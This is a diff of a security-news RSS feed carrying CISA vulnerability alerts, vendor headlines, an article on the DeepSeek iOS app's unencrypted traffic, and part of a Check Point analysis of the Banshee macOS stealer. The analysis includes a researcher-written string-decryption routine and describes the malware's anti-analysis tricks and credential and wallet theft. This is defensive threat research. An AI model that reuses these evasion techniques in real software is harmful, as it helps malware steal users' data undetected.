 &lt;p&gt;&lt;a href="https://www.cisa.gov/binding-operational-directive-22-01" title="Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities"&gt;Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities&lt;/a&gt;&amp;nbsp;established the Known Exploited Vulnerabilities Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the&lt;a&gt;&amp;nbsp;&lt;/a&gt;&lt;a href="https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf" title="BOD 22-01 Fact Sheet"&gt;BOD 22-01 Fact Sheet&lt;/a&gt;&amp;nbsp;for more information.&lt;/p&gt;
-&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Catalog vulnerabilities"&gt;Catalog vulnerabilities&lt;/a&gt;&amp;nbsp;as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities" title="specified criteria"&gt;specified criteria&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">/node/22978</guid></item><item><title>Trimble Releases Security Updates to Address a Vulnerability in Cityworks Software</title><link>https://www.cisa.gov/news-events/alerts/2025/02/07/trimble-releases-security-updates-address-vulnerability-cityworks-software</link><description>&lt;p&gt;CISA is collaborating with private industry partners to respond to reports of exploitation of a vulnerability (CVE-2025-0994) discovered by Trimble impacting its Cityworks Server AMS (Asset Management System). Trimble has released security updates and an advisory addressing a recently discovered deserialization vulnerability enabling an external actor to potentially conduct remote code execution (RCE) against a customer’s Microsoft Internet Information Services (IIS) web server.&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Catalog vulnerabilities"&gt;Catalog vulnerabilities&lt;/a&gt;&amp;nbsp;as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities" title="specified criteria"&gt;specified criteria&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">/node/22978</guid></item><item><title>Trimble Releases Security Updates to Address a Vulnerability in Cityworks Software</title><link>https://www.cisa.gov/news-events/alerts/2025/02/07/trimble-releases-security-updates-address-vulnerability-cityworks-software</link><description>&lt;div class="OutlineElement Ltr SCXW211317631 BCX8"&gt;
+&lt;p&gt;CISA is collaborating with private industry partners to respond to reports of exploitation of a vulnerability (CVE-2025-0994) discovered by Trimble impacting its Cityworks Server AMS (Asset Management System). Trimble has released security updates and an advisory addressing a recently discovered deserialization vulnerability enabling an external actor to potentially conduct remote code execution (RCE) against a customer’s Microsoft Internet Information Services (IIS) web server.&amp;nbsp;&lt;/p&gt;
 &lt;p&gt;CISA has added CVE-2025-0994 to its &lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog"&gt;Known Exploited Vulnerabilities Catalog&lt;/a&gt;, based on evidence of active exploitation.&amp;nbsp;&lt;/p&gt;
-
-
+&lt;/div&gt;
+&lt;div class="OutlineElement Ltr SCXW211317631 BCX8"&gt;
 &lt;p&gt;CISA strongly encourages users and administrators to search for indicators of compromise (IOCs) and apply the necessary updates and workarounds.&amp;nbsp;&lt;/p&gt;
-
-
+&lt;/div&gt;
+&lt;div class="OutlineElement Ltr SCXW211317631 BCX8"&gt;
 &lt;p&gt;Review the following article for more information:&amp;nbsp;&lt;/p&gt;
-
-
+&lt;/div&gt;
+&lt;div class="ListContainerWrapper SCXW211317631 BCX8"&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href="https://learn.assetlifecycle.trimble.com/i/1532182-cityworks-customer-communication-2025-02-05-docx/0" title="Trimble Advisory"&gt;Trimble Advisory and IOCs for Vulnerability Affecting Cityworks Deployments&amp;nbsp;&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-
-
-&lt;p&gt;&lt;br /&gt;The Symantec Threat Hunter team, part of Broadcom, contributed to this guidance.&amp;nbsp;&lt;/p&gt;</description><guid isPermaLink="false">/node/22977</guid></item><item><title>Exciting updates to the Copilot (AI) Bounty Program: Enhancing security and incentivizing innovation</title><link>https://msrc.microsoft.com/blog/2025/02/exciting-updates-to-the-copilot-ai-bounty-program-enhancing-security-and-incentivizing-innovation/</link><description>At Microsoft, we are committed to fostering a secure and innovative environment for our customers and users. As part of this commitment, we are thrilled to announce significant updates to our Copilot (AI) Bounty Program. These changes are designed to enhance the program&amp;rsquo;s effectiveness, incentivize broader participation, and ensure that our Copilot consumer products remain robust, safe, and secure.</description><guid isPermaLink="false">https://msrc.microsoft.com/blog/2025/02/exciting-updates-to-the-copilot-ai-bounty-program-enhancing-security-and-incentivizing-innovation/</guid></item><item><title>Chinese-Speaking Group Manipulates SEO with BadIIS</title><link>https://www.trendmicro.com/en_us/research/25/b/chinese-speaking-group-manipulates-seo-with-badiis.html</link><description>This blog post details our analysis of an SEO manipulation campaign targeting Asia. We also share recommendations that can help enterprises proactively secure their environment.</description><guid isPermaLink="false">urn:uuid:66269b3d-b8ec-2f63-5a65-5d5cd840d996</guid><category>Trend Micro Research : Malware</category><category>Trend Micro Research : Web</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>DeepSeek iOS app sends data unencrypted to ByteDance-controlled servers</title><link>https://arstechnica.com/security/2025/02/deepseek-ios-app-sends-data-unencrypted-to-bytedance-controlled-servers/</link><description>Apple's defenses that protect data from being sent in the clear are globally disabled.</description><content:encoded>&lt;p&gt;A little over two weeks ago, a largely unknown China-based company named DeepSeek &lt;a href="https://arstechnica.com/ai/2025/01/china-is-catching-up-with-americas-best-reasoning-ai-models/"&gt;stunned the AI world&lt;/a&gt; with the release of an open source AI chatbot that had simulated reasoning capabilities that were largely on par with those from market leader OpenAI. Within days, the DeepSeek AI assistant app climbed to the top of the iPhone App Store's "Free Apps" category, overtaking ChatGPT.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class="OutlineElement Ltr SCXW211317631 BCX8"&gt;
+&lt;p&gt;&lt;br /&gt;The Symantec Threat Hunter team, part of Broadcom, contributed to this guidance.&amp;nbsp;&lt;/p&gt;
+&lt;/div&gt;</description><guid isPermaLink="false">/node/22977</guid></item><item><title>Exciting updates to the Copilot (AI) Bounty Program: Enhancing security and incentivizing innovation</title><link>https://msrc.microsoft.com/blog/2025/02/exciting-updates-to-the-copilot-ai-bounty-program-enhancing-security-and-incentivizing-innovation/</link><description>At Microsoft, we are committed to fostering a secure and innovative environment for our customers and users. As part of this commitment, we are thrilled to announce significant updates to our Copilot (AI) Bounty Program. These changes are designed to enhance the program&amp;rsquo;s effectiveness, incentivize broader participation, and ensure that our Copilot consumer products remain robust, safe, and secure.</description><guid isPermaLink="false">https://msrc.microsoft.com/blog/2025/02/exciting-updates-to-the-copilot-ai-bounty-program-enhancing-security-and-incentivizing-innovation/</guid></item><item><title>Chinese-Speaking Group Manipulates SEO with BadIIS</title><link>https://www.trendmicro.com/en_us/research/25/b/chinese-speaking-group-manipulates-seo-with-badiis.html</link><description>This blog post details our analysis of an SEO manipulation campaign targeting Asia. We also share recommendations that can help enterprises proactively secure their environment.</description><guid isPermaLink="false">urn:uuid:66269b3d-b8ec-2f63-5a65-5d5cd840d996</guid><category>Trend Micro Research : Malware</category><category>Trend Micro Research : Web</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>DeepSeek iOS app sends data unencrypted to ByteDance-controlled servers</title><link>https://arstechnica.com/security/2025/02/deepseek-ios-app-sends-data-unencrypted-to-bytedance-controlled-servers/</link><description>Apple's defenses that protect data from being sent in the clear are globally disabled.</description><content:encoded>&lt;p&gt;A little over two weeks ago, a largely unknown China-based company named DeepSeek &lt;a href="https://arstechnica.com/ai/2025/01/china-is-catching-up-with-americas-best-reasoning-ai-models/"&gt;stunned the AI world&lt;/a&gt; with the release of an open source AI chatbot that had simulated reasoning capabilities that were largely on par with those from market leader OpenAI. Within days, the DeepSeek AI assistant app climbed to the top of the iPhone App Store's "Free Apps" category, overtaking ChatGPT.&lt;/p&gt;
 &lt;p&gt;On Thursday, mobile security company &lt;a href="https://www.nowsecure.com/blog/2025/02/06/nowsecure-uncovers-multiple-security-and-privacy-flaws-in-deepseek-ios-mobile-app/"&gt;NowSecure reported&lt;/a&gt; that the app sends sensitive data over unencrypted channels, making the data readable to anyone who can monitor the traffic. More sophisticated attackers could also tamper with the data while it's in transit. Apple strongly encourages iPhone and iPad developers to enforce encryption of data sent over the wire using ATS (&lt;a href="https://developer.apple.com/documentation/security/preventing-insecure-network-connections"&gt;App Transport Security&lt;/a&gt;). For unknown reasons, that protection is globally disabled in the app, NowSecure said.&lt;/p&gt;
 &lt;h2&gt;Basic security protections MIA&lt;/h2&gt;
 &lt;p&gt;What’s more, the data is sent to servers that are controlled by ByteDance, the Chinese company that owns TikTok. While some of that data is properly encrypted using transport layer security, once it's decrypted on the ByteDance-controlled servers, it can be cross-referenced with user data collected elsewhere to identify specific users and potentially track queries and other usage.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/02/deepseek-ios-app-sends-data-unencrypted-to-bytedance-controlled-servers/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;
@@ -10588,13 +11362,19 @@ broadcast 203.0.113.255 dev lo proto kernel scope link src 203.0.113.0&lt;/code&
 
 
 &lt;p&gt;To learn more, get in touch with us &lt;a href="https://cybersecurity.opentext.com/contact/?utm_medium=referral&amp;amp;utm_source=cybersecurity.opentext.com&amp;amp;utm_campaign=25q2-am-smb-website-securecloudblog-contactus" rel="noreferrer noopener" target="_blank"&gt;here&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/02/05/opentext-secure-cloud-streamline-workflows-with-integrations/" rel="nofollow"&gt;OpenText Secure Cloud: Streamline workflows with integrations&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.webroot.com/blog/?p=33653</guid><category>Threat Lab</category></item><item><title>Joint stakeholder report reagrding the 49th Universal Periodic Review – Kenya</title><link>http://privacyinternational.org/advocacy/5518/joint-stakeholder-report-reagrding-49th-universal-periodic-review-kenya</link><guid isPermaLink="false">5518 at http://privacyinternational.org</guid></item><item><title>Joint submission in advance of the consideration of Kenya at the 77th session of the Committee on Economic, Social and Cultural Rights</title><link>http://privacyinternational.org/advocacy/5517/joint-submission-advance-consideration-kenya-77th-session-committee-economic-social</link><guid isPermaLink="false">5517 at http://privacyinternational.org</guid></item><item><title>PI’s submission in advance of the consideration of the United Kingdom at the 77th session of the Committee on Economic, Social and Cultural Rights</title><link>http://privacyinternational.org/advocacy/5516/pis-submission-advance-consideration-united-kingdom-77th-session-committee-economic</link><guid isPermaLink="false">5516 at http://privacyinternational.org</guid></item><item><title>Karisma and Privacy International’s Submission to the UN Special Rapporteur on extreme poverty and human rights</title><link>http://privacyinternational.org/advocacy/5515/karisma-and-privacy-internationals-submission-un-special-rapporteur-extreme-poverty</link><guid isPermaLink="false">5515 at http://privacyinternational.org</guid></item><item><title>CISA Adds One Known Exploited Vulnerability to Catalog</title><link>https://www.cisa.gov/news-events/alerts/2025/02/05/cisa-adds-one-known-exploited-vulnerability-catalog</link><description>&lt;p&gt;CISA has added one new vulnerability to its&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities Catalog"&gt;Known Exploited Vulnerabilities Catalog&lt;/a&gt;, based on evidence of active exploitation.&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/02/05/opentext-secure-cloud-streamline-workflows-with-integrations/" rel="nofollow"&gt;OpenText Secure Cloud: Streamline workflows with integrations&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.webroot.com/blog/?p=33653</guid><category>Threat Lab</category></item><item><title>Joint stakeholder report reagrding the 49th Universal Periodic Review – Kenya</title><link>http://privacyinternational.org/advocacy/5518/joint-stakeholder-report-reagrding-49th-universal-periodic-review-kenya</link><guid isPermaLink="false">5518 at http://privacyinternational.org</guid></item><item><title>Joint submission in advance of the consideration of Kenya at the 77th session of the Committee on Economic, Social and Cultural Rights</title><link>http://privacyinternational.org/advocacy/5517/joint-submission-advance-consideration-kenya-77th-session-committee-economic-social</link><guid isPermaLink="false">5517 at http://privacyinternational.org</guid></item><item><title>PI’s submission in advance of the consideration of the United Kingdom at the 77th session of the Committee on Economic, Social and Cultural Rights</title><link>http://privacyinternational.org/advocacy/5516/pis-submission-advance-consideration-united-kingdom-77th-session-committee-economic</link><guid isPermaLink="false">5516 at http://privacyinternational.org</guid></item><item><title>Karisma and Privacy International’s Submission to the UN Special Rapporteur on extreme poverty and human rights</title><link>http://privacyinternational.org/advocacy/5515/karisma-and-privacy-internationals-submission-un-special-rapporteur-extreme-poverty</link><guid isPermaLink="false">5515 at http://privacyinternational.org</guid></item><item><title>CISA Adds One Known Exploited Vulnerability to Catalog</title><link>https://www.cisa.gov/news-events/alerts/2025/02/05/cisa-adds-one-known-exploited-vulnerability-catalog</link><description>&lt;div class="l-full__header"&gt;
+&lt;div class="c-page-title"&gt;
+&lt;div class="c-page-title__inner l-constrain"&gt;
+&lt;p&gt;CISA has added one new vulnerability to its&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities Catalog"&gt;Known Exploited Vulnerabilities Catalog&lt;/a&gt;, based on evidence of active exploitation.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a class="ext" href="https://www.cve.org/CVERecord?id=CVE-2024-53104" title="Linux Kernel Out-of-Bounds Write Vulnerability"&gt;CVE-2024-53104&lt;/a&gt;&amp;nbsp;Linux Kernel Out-of-Bounds Write Vulnerability&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://www.cisa.gov/binding-operational-directive-22-01" title="Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities"&gt;Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities&lt;/a&gt;&amp;nbsp;established the Known Exploited Vulnerabilities Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the&lt;a&gt;&amp;nbsp;&lt;/a&gt;&lt;a href="https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf" title="BOD 22-01 Fact Sheet"&gt;BOD 22-01 Fact Sheet&lt;/a&gt;&amp;nbsp;for more information.&lt;/p&gt;
-&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Catalog vulnerabilities"&gt;Catalog vulnerabilities&lt;/a&gt;&amp;nbsp;as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities" title="specified criteria"&gt;specified criteria&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">/node/22961</guid></item><item><title>CISA Releases Nine Industrial Control Systems Advisories</title><link>https://www.cisa.gov/news-events/alerts/2025/02/04/cisa-releases-nine-industrial-control-systems-advisories</link><description>&lt;p&gt;CISA released nine Industrial Control Systems (ICS) advisories on February 4, 2025. These advisories provide timely information about current security issues, vulnerabilities, and exploits surrounding ICS.&lt;/p&gt;
+&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Catalog vulnerabilities"&gt;Catalog vulnerabilities&lt;/a&gt;&amp;nbsp;as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities" title="specified criteria"&gt;specified criteria&lt;/a&gt;.&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description><guid isPermaLink="false">/node/22961</guid></item><item><title>CISA Releases Nine Industrial Control Systems Advisories</title><link>https://www.cisa.gov/news-events/alerts/2025/02/04/cisa-releases-nine-industrial-control-systems-advisories</link><description>&lt;p&gt;CISA released nine Industrial Control Systems (ICS) advisories on February 4, 2025. These advisories provide timely information about current security issues, vulnerabilities, and exploits surrounding ICS.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;ICSA-25-035-01 &lt;a href="https://www.cisa.gov/news-events/ics-advisories/icsa-25-035-01"&gt;Western Telematic Inc NPS Series, DSM Series, CPM Series&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;ICSA-25-035-02 &lt;a href="https://www.cisa.gov/news-events/ics-advisories/icsa-25-035-02"&gt;Rockwell Automation 1756-L8zS3 and 1756-L3zS3&lt;/a&gt;&lt;/li&gt;
@@ -12002,752 +12782,7 @@ e622f3b743c7fc0a011b07a2e656aa2b5e50a4876721bcf1f405d582ca4cda22
 20ed21bfdb7aa970b12e7368eba8e26a711752f1cc5416b6fd6629d0e2a44e5d
 dd15ce869aa79884753e3baad19b0437075202be86268b84f3ec2303e1ecd966
 7e223a685d5324491bcacf3127869f9f3ec5d5100c5e7cb5af45a227e6ab4603&lt;/pre&gt;
-&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/funksec-alleged-top-ransomware-group-powered-by-ai/"&gt;FunkSec – Alleged Top Ransomware Group Powered by AI&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=30996</guid><category>Check Point Research Publications</category></item><item><title>Trend Micro™ Managed XDR Analysis of Infection From Fake Installers and Cracks</title><link>https://www.trendmicro.com/en_us/research/25/a/how-cracks-and-installers-bring-malware-to-your-device.html</link><description>Our research shows how attackers use platforms like YouTube to spread fake installers via trusted hosting services, employing encryption to evade detection and steal sensitive browser data.</description><guid isPermaLink="false">urn:uuid:e0eb8943-e39a-7102-c821-f9d557360f85</guid><category>Trend Micro Research : Malware</category><category>Trend Micro Research : Endpoints</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>Banshee: The Stealer That “Stole Code” From MacOS XProtect</title><link>https://research.checkpoint.com/2025/banshee-macos-stealer-that-stole-code-from-macos-xprotect/</link><description>&lt;p&gt;Research by:&amp;#160;Antonis Terefos (@Tera0017) Key Points Introduction As of 2024, approximately 100.4 million people worldwide use macOS, accounting for 15.1% of the global PC market. Of the millions of macOS users, many falsely assume that their systems are inherently secure from malware. This perception stems from macOS&amp;#8217;s Unix-based architecture and historically lower market share, making [&amp;#8230;]&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/banshee-macos-stealer-that-stole-code-from-macos-xprotect/"&gt;Banshee: The Stealer That &amp;#8220;Stole Code&amp;#8221; From MacOS XProtect&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;&lt;strong&gt;Research by:&lt;/strong&gt;&amp;nbsp;Antonis Terefos (&lt;a href="https://x.com/Tera0017"&gt;&lt;strong&gt;@Tera0017&lt;/strong&gt;&lt;/a&gt;)&lt;/p&gt;
-
-
-
-&lt;h1 class="wp-block-heading"&gt;&lt;strong&gt;Key Points&lt;/strong&gt;&lt;/h1&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;Since September, &lt;strong&gt;Check Point Research&lt;/strong&gt; has been monitoring a new version of the &lt;strong&gt;Banshee macOS stealer&lt;/strong&gt;, a malware linked to Russian-speaking cyber criminals targeting &lt;strong&gt;macOS users&lt;/strong&gt;.&lt;/li&gt;
-
-
-
-&lt;li&gt;This new version had been undetected for over two months until the original version of Banshee Stealer was leaked on XSS forums, which resembled similarities with the malware&amp;#8217;s core functionality.&lt;/li&gt;
-
-
-
-&lt;li&gt;One notable difference between the leaked source code and the version discovered by Check Point Research is the use of a string encryption algorithm. This algorithm is the same as &lt;strong&gt;Apple&lt;/strong&gt; uses in its &lt;strong&gt;Xprotect antivirus&lt;/strong&gt; engine for &lt;strong&gt;MacOS&lt;/strong&gt;.&lt;/li&gt;
-
-
-
-&lt;li&gt;One method of distributing Banshee Stealer involved malicious GitHub repositories, targeting Windows users with Lumma Stealer and macOS users with Banshee Stealer.&lt;/li&gt;
-
-
-
-&lt;li&gt;Banshee operated as a &amp;#8216;stealer-as-a-service&amp;#8217;, priced at $3,000, and was advertised through Telegram and forums such as XSS and Exploit. On November 23, 2024, the malware’s source code was leaked, leading the author to shut down the operations the following day.&lt;/li&gt;
-
-
-
-&lt;li&gt;Despite shutting down the operation, threat actors continue to distribute the new version of Banshee via phishing websites.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;h1 class="wp-block-heading"&gt;Introduction&lt;/h1&gt;
-
-
-
-&lt;p&gt;As of 2024, approximately 100.4 million people worldwide use macOS, accounting for 15.1% of the global PC market. Of the millions of macOS users, many falsely assume that their systems are inherently secure from malware. This perception stems from macOS&amp;#8217;s Unix-based architecture and historically lower market share, making it a less attractive target for cyber criminals. While macOS includes robust security measures like Gatekeeper, XProtect, and sandboxing, no operating system is entirely immune to threats, making users&amp;#8217; false sense of security all the more dangerous.&lt;/p&gt;
-
-
-
-&lt;p&gt;As macOS&amp;#8217;s popularity grows, attackers increasingly target the platform. Modern threats include sophisticated malware, phishing attacks, and malicious software like &lt;strong&gt;Banshee&lt;/strong&gt;, a stealthy macOS stealer, a new stealer that was made public for the first time in July 2024. This malware targets MacOS users and is able to steal browser and login credentials, cryptocurrency wallets, and sensitive information from files. Through July to November, Banshee’s author operated a stealer-as-a-service on Telegram and on dark web forums such as XSS and Exploit and continued to improve the malware. During this time, the author hired two members to carry out campaigns targeting MacOS users.&lt;/p&gt;
-
-
-
-&lt;p&gt;In late September, &lt;strong&gt;Check Point Research&lt;/strong&gt; identified a new, undetected version of Banshee Stealer targeting macOS. This updated version introduced string encryption, as previous versions contained all the strings in plain text. However, Banshee’s author “stole” the string encryption algorithm from Apple&amp;#8217;s MacOS XProtect antivirus engine. Threat actors distributed this new version mainly via phishing websites and malicious &lt;a href="https://research.checkpoint.com/2024/stargazers-ghost-network/"&gt;GitHub&lt;/a&gt; repositories. In some GitHub campaigns, threat actors targeted both Windows and MacOS users with Lumma and Banshee Stealer.&lt;/p&gt;
-
-
-
-&lt;p&gt;For over two months, this updated version of Banshee successfully evaded detection by most antivirus engines until its original code was leaked on XSS forums, allowing antivirus engines to detect its core functionality. Once the source code was leaked, the Banshee stealer-as-a-service operation was shut down to the general public. However, &lt;strong&gt;Check Point Research&lt;/strong&gt; continues to observe campaigns distributing malware through phishing websites that masquerade as legitimate software.&lt;/p&gt;
-
-
-
-&lt;h1 class="wp-block-heading"&gt;Malware Analysis&lt;/h1&gt;
-
-
-
-&lt;p&gt;In late September, &lt;strong&gt;Check Point Research&lt;/strong&gt; obtained new versions of &lt;strong&gt;Banshee Stealer&lt;/strong&gt;. The discovered samples remained undetected by antivirus engines on &lt;strong&gt;VirusTotal&lt;/strong&gt; for over two months. Only once the Banshee Stealer &lt;strong&gt;source code&lt;/strong&gt; was leaked on &lt;strong&gt;November 23&lt;/strong&gt; on &lt;strong&gt;XSS underground forums&lt;/strong&gt; did antivirus vendors update their detection rules to identify both the original leaked code and any updated versions.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30937" height="287" src="https://research.checkpoint.com/wp-content/uploads/2024/12/001-1024x287.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1 &amp;#8211; Unpacked Banshee MacOS Stealer detection.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Although the core functionality of both the older and newer versions remains unchanged, one key difference is the introduction of string encryption, which replaces the plain text strings from samples &lt;a href="https://www.elastic.co/security-labs/beyond-the-wail"&gt;reported&lt;/a&gt; in August. When &lt;strong&gt;Check Point Research&lt;/strong&gt; first obtained encrypted samples in late September, we created a Yara rule based on the string encryption, resulting in many false positives. However, upon further investigation, we discovered that Banshee employs the same encryption method that Apple utilizes in macOS for string encryption within its antivirus engine, XProtect. As previously noted by a &lt;a href="https://alden.io/posts/secrets-of-xprotect/#reverse-engineering-the-redpine-remediator"&gt;researcher&lt;/a&gt;, this same encryption is used for &lt;em&gt;“encrypted YARA rules stored within the XProtect Remediator binaries&amp;#8221;&lt;/em&gt;.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30939" height="412" src="https://research.checkpoint.com/wp-content/uploads/2024/12/002.png" width="786" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2 &amp;#8211; Banshee Stealer (left), MacOS XProtect Remediator Binary (right).&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Python representation:&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;def macos_xprotect_string_decryption(encrypted: bytes, encr_key: int) -&gt; str:
-    """
-    Author: @Check Point Research
-    Decrypts MacOS Xprotect binaries &amp;amp; Banshee Stealer encrypted strings.
-    """
-    decrypted = "".join(
-        chr(
-            (encr_key &gt;&gt; ((i * 8) &amp;amp; 0x38) &amp;amp; 0xFF) ^ encrypted[i]
-        )
-        for i in range(len(encrypted))
-    )
-    return decrypted.partition("\\x00")[0]
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;While &lt;strong&gt;XProtect&lt;/strong&gt; binaries decrypt YARA rules for detection purposes, &lt;strong&gt;Banshee Stealer&lt;/strong&gt; uses the same algorithm to decrypt critical strings for its functionality. These strings include:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;commands executed&lt;/li&gt;
-
-
-
-&lt;li&gt;browser names and paths&lt;/li&gt;
-
-
-
-&lt;li&gt;extension IDs&lt;/li&gt;
-
-
-
-&lt;li&gt;wallets and their paths&lt;/li&gt;
-
-
-
-&lt;li&gt;command-and-control (C&amp;amp;C) information&lt;/li&gt;
-
-
-
-&lt;li&gt;and many other strings observed in the leaked source code.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Technical Analysis&lt;/h2&gt;
-
-
-
-&lt;p&gt;Upon decrypting the strings, we observed that Banshee&amp;#8217;s core functionality remains largely unchanged. The updates primarily pertain to the additional anti-analysis techniques. The first technique uses the &lt;code&gt;fork()&lt;/code&gt; function, which creates a child process that may escape debuggers attached to the parent process. Before the parent process terminates, it runs the command &lt;code&gt;killall Terminal&lt;/code&gt; to close any open terminal sessions. Meanwhile, the child process calls &lt;code&gt;setsid()&lt;/code&gt; to initiate a daemon in the background, trying to mimic a legitimate system service and blend in with normal processes. Then, a second child process is created, while the first child is terminated. The final child process attempts to get &lt;code&gt;rwx&lt;/code&gt; access to the root directory, and if it fails, it will stop the malware infection; if it succeeds, it closes &lt;code&gt;stdin&lt;/code&gt;, &lt;code&gt;stdout&lt;/code&gt;, and &lt;code&gt;stderr&lt;/code&gt; and redirects them to &lt;code&gt;/dev/null&lt;/code&gt;. This ensures that the malware runs silently without producing output or errors that could alert the user of malicious behavior. This also prevents any interaction with debugging tools that might monitor input/output behavior.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31019" height="373" src="https://research.checkpoint.com/wp-content/uploads/2025/01/003.png" width="1123" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3 &amp;#8211; Anti-analysis forks and function calls.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Once those checks have been passed, &lt;strong&gt;Banshee&lt;/strong&gt; proceeds by retrieving the &lt;strong&gt;HOME&lt;/strong&gt; and &lt;strong&gt;TMP&lt;/strong&gt; directories and creating a ten-character directory within &lt;strong&gt;TMP&lt;/strong&gt;. These directories are used to steal user information, browser data, and as for the created directory, to store the stolen data. At this stage, the malware functions similarly to the leaked code and previous versions. However, one notable change in the updated code is the removal of the language check, which previously terminated the process if Russian was detected.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Stealer Capabilities&lt;/h2&gt;
-
